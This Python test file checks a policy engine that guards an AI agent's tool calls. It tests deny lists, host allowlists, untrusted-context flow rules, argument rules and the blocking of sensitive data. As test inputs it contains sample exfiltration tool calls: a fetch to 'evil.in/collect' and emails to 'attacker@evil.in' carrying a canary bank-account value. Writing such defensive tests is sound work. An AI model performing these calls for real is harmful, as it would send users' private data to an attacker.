from hypothesis import given, settings
from hypothesis import strategies as st

from engine.defense.engine import PolicyContext, decide
from engine.defense.policy_ir import ArgPredicate, FlowRule, Policy, union_policies, validate_policy
from engine.defense.compile_openshell import compile_openshell, validate_openshell
from engine.llm.models import ToolCall
from engine.world.canaries import Canary, SensitivityVault, VaultItem


def base_policy(**kwargs):
    data = {
        "task_class": "inbox",
        "allowed_tools": ["email.read", "email.send"],
        "allowed_hosts": ["mail.google.com"],
        "denied_tools": [],
        "arg_rules": {},
        "flow_rules": [],
        "on_violation": "block",
    }
    data.update(kwargs)
    return Policy.model_validate(data)


@given(st.text(min_size=1, max_size=30), st.text(min_size=0, max_size=30))
@settings(max_examples=60)
def test_denied_tool_always_blocks(tool: str, arg: str):
    policy = base_policy(denied_tools=[tool])
    ctx = PolicyContext(trusted_emails={"friend@example.com"}, user_email="me@example.com")
    decision = decide(policy, ToolCall(name=tool, args={"body": arg}), ctx)
    assert decision.decision == "block"
    assert decision.rule_id == "deny.tool"


def test_allowlist_blocks_unknown_tool_and_host():
    policy = base_policy()
    ctx = PolicyContext(trusted_emails=set(), user_email="me@example.com")
    assert decide(policy, ToolCall(name="shell.exec", args={}), ctx).decision == "block"
    host_rule = base_policy(allowed_tools=["web.fetch"], allowed_hosts=["weather.com"])
    d = decide(host_rule, ToolCall(name="web.fetch", args={"url": "https://evil.in/collect"}), ctx)
    assert d.decision == "block" and d.rule_id == "allow.host"


def test_flow_blocks_untrusted_recipient_but_allows_trusted():
    policy = base_policy(
        allowed_tools=["email.send"],
        flow_rules=[
            FlowRule(
                id="FR1",
                when="context.untrusted",
                sinks=["email.*"],
                require={"recipient_or_host": "in_user_task_or_trusted_contacts"},
            )
        ],
    )
    ctx = PolicyContext(untrusted=True, trusted_emails={"friend@example.com"}, user_email="me@example.com")
    bad = decide(policy, ToolCall(name="email.send", args={"to": "attacker@evil.in", "body": "hi"}), ctx)
    assert bad.decision == "block" and bad.rule_id == "flow.untrusted"
    good = decide(policy, ToolCall(name="email.send", args={"to": "friend@example.com", "body": "hi"}), ctx)
    assert good.decision == "allow"


def test_dlp_blocks_labelled_payload():
    canary = Canary(
        canary_id="BANK-ACCOUNT-001",
        category="bank",
        token="PFABCDEFGHIJ",
        value="50100234567890",
        label="account",
        sensitivity="bank",
        location="bank.account",
    ).finalize()
    vault = SensitivityVault(
        persona_id="test",
        items=[VaultItem("BANK-ACCOUNT-001", "bank", "account", "50100234567890", "bank", "bank.account")],
    )
    policy = base_policy(allowed_tools=["email.send"], allowed_hosts=[])
    ctx = PolicyContext(vault=vault, trusted_emails=set(), user_email="me@example.com", dlp_enabled=True)
    d = decide(policy, ToolCall(name="email.send", args={"to": "x@example.com", "body": canary.value}), ctx)
    assert d.decision == "block" and d.rule_id == "dlp.sensitive"


def test_arg_rule_recipient_subset():
    policy = base_policy(
        allowed_tools=["email.send"],
        arg_rules={"email.send": {"to": ArgPredicate(subset_of="$contacts.trusted")}},
    )
    ctx = PolicyContext(trusted_emails={"friend@example.com"}, user_email="me@example.com")
    assert decide(policy, ToolCall(name="email.send", args={"to": "evil@x.in", "body": "x"}), ctx).decision == "block"
    assert decide(policy, ToolCall(name="email.send", args={"to": "friend@example.com", "body": "x"}), ctx).decision == "allow"


def test_union_and_schema_and_openshell():
    a = base_policy(task_class="inbox")
    b = base_policy(task_class="research", allowed_hosts=["weather.com"], allowed_tools=["web.fetch"])
    union = union_policies([a, b])
    validate_policy(union)
    assert "web.fetch" in union.allowed_tools and "email.send" in union.allowed_tools
    text = compile_openshell(union)
    ok, errors = validate_openshell(text)
    assert ok, errors
    assert "run_as_user: sandbox" in text
